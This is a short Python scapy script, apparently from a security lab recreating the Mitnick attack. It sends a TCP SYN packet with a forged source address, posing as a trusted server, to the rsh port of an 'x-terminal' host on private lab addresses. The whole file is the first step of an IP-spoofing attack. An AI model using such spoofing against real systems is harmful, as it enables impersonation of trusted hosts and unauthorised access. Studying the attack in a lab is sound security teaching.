#!usr/bin/python3

from scapy.all import *

trusted_server = "10.9.0.6"  # server ip
trusted_port = 1023          # server port
victim = "10.9.0.5"          # x-terminal ip
victim_port = 514            # x-terminal port

print("Sending Spoofed SYN packet to X-terminal (" + victim + ")")
ip = IP(src= trusted_server, dst= victim) #src is trusted server and dst is victim
tcp = TCP(sport= trusted_port,dport= victim_port,flags="S", seq=123456789)
pkt = ip/tcp
send(pkt,verbose=0)
